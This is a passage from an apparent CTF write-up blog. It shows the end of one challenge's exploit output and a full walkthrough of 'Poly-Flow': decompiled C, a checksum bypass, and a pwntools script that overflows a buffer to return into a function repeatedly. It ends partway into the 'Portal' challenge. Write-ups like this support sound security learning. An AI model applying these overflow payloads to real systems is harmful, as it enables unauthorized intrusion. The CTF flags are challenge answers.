</span></span><span style="display:flex;"><span><span style="color:#555">[</span>*<span style="color:#555">]</span> Puts got   : 0x5624841f3cd0
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>*<span style="color:#555">]</span> p_ctf<span style="color:#555">{</span>Ch4Ng3_1T_t0_M4x1Mum<span style="color:#555">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: p_ctf{Ch4Ng3_1T_t0_M4x1Mum}</p>
</blockquote>
<h3 id="poly-flow">Poly-Flow <a href="#poly-flow" class="anchor">#</a></h3>
<h4 id="intro-1">Intro <a href="#intro-1" class="anchor">#</a></h4>
<p>We were given a binary, let&rsquo;s decompile it. Below is the main function</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined local_21 [<span style="color:#f60">16</span>];
</span></span><span style="display:flex;"><span>  undefined local_11;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#555">*</span>local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">&amp;</span>stack0x00000004;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Enter the passphrase: &#34;</span>);
</span></span><span style="display:flex;"><span>  fflush((FILE <span style="color:#555">*</span>)stdout);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#555">&amp;</span>DAT_080d403c,local_21);
</span></span><span style="display:flex;"><span>  local_11 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#555">=</span> check(local_21);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Incorrect.&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    input();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check function</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#c0f">check</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  size_t sVar1;
</span></span><span style="display:flex;"><span>  undefined4 uVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_14;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  sVar1 <span style="color:#555">=</span> strlen(param_1);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (sVar1 <span style="color:#555">==</span> <span style="color:#f60">0x10</span>) {
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> (local_14 <span style="color:#555">=</span> <span style="color:#f60">0</span>; local_14 <span style="color:#555">&lt;</span> <span style="color:#f60">4</span>; local_14 <span style="color:#555">=</span> local_14 <span style="color:#555">+</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>      local_10 <span style="color:#555">=</span> local_10 <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">int</span> <span style="color:#555">*</span>)(param_1 <span style="color:#555">+</span> local_14 <span style="color:#555">*</span> <span style="color:#f60">4</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">==</span> L<span style="color:#a00;background-color:#faa">&#39;\</span>xdeadbeef<span style="color:#a00;background-color:#faa">&#39;</span>) {
</span></span><span style="display:flex;"><span>      uVar2 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>      uVar2 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> uVar2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>input function</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">input</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_1c [<span style="color:#f60">20</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (i<span style="color:#f60">.0</span> <span style="color:#555">==</span> <span style="color:#f60">5</span>) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Here is your flag.&#34;</span>);
</span></span><span style="display:flex;"><span>    system(<span style="color:#c30">&#34;cat flag&#34;</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  i<span style="color:#f60">.0</span> <span style="color:#555">=</span> i<span style="color:#f60">.0</span> <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  fgets(local_1c,<span style="color:#f60">0x24</span>,(FILE <span style="color:#555">*</span>)stdin);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="analysis-1">Analysis <a href="#analysis-1" class="anchor">#</a></h4>
<p>Okay, so the flow is:</p>
<ul>
<li>Need to pass <code>check</code> function, where we need to pass a string, where if it get splitted into 4 chunks where a chunk consist of 4 bytes, the sum of the 4 chunks is <code>0xdeadbeef</code>.</li>
<li>After that we will go to <code>input</code> method. Notice that there is a buffer overflow, where we can replace the return value of <code>input</code></li>
</ul>
<h4 id="solution-1">Solution <a href="#solution-1" class="anchor">#</a></h4>
<p>So, below is the solver script, where we simply:</p>
<ul>
<li>Pass a string that the 4 chunks sum is <code>0xdeadbeef</code></li>
<li>And then with BOF, we can ret to the input 5 times, so that the binary will cat the flag.</li>
</ul>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>from pwn import *
</span></span><span style="display:flex;"><span>from pwn import p64, u64, p32
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.arch = &#39;amd64&#39;
</span></span><span style="display:flex;"><span>context.encoding = &#39;latin&#39;
</span></span><span style="display:flex;"><span>context.log_level = &#39;INFO&#39;
</span></span><span style="display:flex;"><span>warnings.simplefilter(&#34;ignore&#34;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf = ELF(&#39;./Poly-flow&#39;)
</span></span><span style="display:flex;"><span>input_addr = elf.symbols[&#39;input&#39;]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r = remote(&#39;binary.challs.pragyanctf.tech&#39;, 6002)
</span></span><span style="display:flex;"><span>r.sendafter(b&#39;passphrase: &#39;, p32(0x37ab6fbb)*3+p32(0x37ab6fbb+3)) # deadbeef
</span></span><span style="display:flex;"><span>r.send(b&#39;a&#39;*0x1c + p32(input_addr) + b&#39;a&#39;*0x4)
</span></span><span style="display:flex;"><span>r.send(b&#39;a&#39;*0x1b + p32(input_addr) + b&#39;a&#39;*0x4) # one-byte adjustment based on observation in GDB
</span></span><span style="display:flex;"><span>r.send(b&#39;a&#39;*0x1b + p32(input_addr) + b&#39;a&#39;*0x4) # one-byte adjustment based on observation in GDB
</span></span><span style="display:flex;"><span>r.send(b&#39;a&#39;*0x1b + p32(input_addr) + b&#39;a&#39;*0x4) # one-byte adjustment based on observation in GDB
</span></span><span style="display:flex;"><span>r.send(b&#39;a&#39;*0x1b + p32(input_addr) + b&#39;a&#39;*0x4) # one-byte adjustment based on observation in GDB
</span></span><span style="display:flex;"><span>r.interactive()
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: p_ctf{mUlT1Pl3_BuFf3R_Ov3rF|0w}</p>
</blockquote>
<h3 id="portal">Portal <a href="#portal" class="anchor">#</a></h3>
<h4 id="intro-2">Intro <a href="#intro-2" class="anchor">#</a></h4>
<p>We were given a binary. Below is the main decompiled:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_14;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  local_14 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  initialize();
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Welcome!&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">do</span> {
</span></span><span style="display:flex;"><span>    putchar(<span style="color:#f60">10</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;What would you like to do?&#34;</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;1) Check Balance&#34;</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;2) Upgrade Pack&#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#555">&amp;</span>DAT_0010218f,<span style="color:#555">&amp;</span>local_14);
</span></span><span style="display:flex;"><span>    getchar();
</span></span><span style="display:flex;"><span>    fflush(stdin);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (local_14 <span style="color:#555">==</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>      see_balance();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (local_14 <span style="color:#555">==</span> <span style="color:#f60">2</span>) {
</span></span><span style="display:flex;"><span>      init_pack();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (local_14 <span style="color:#555">!=</span> <span style="color:#f60">3</span>) {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;Invalid &#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>          __stack_chk_fail();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      check <span style="color:#555">=</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>      see_profile();
</span></span><span style="display:flex;"><span>      check <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Bye!&#34;</span>);
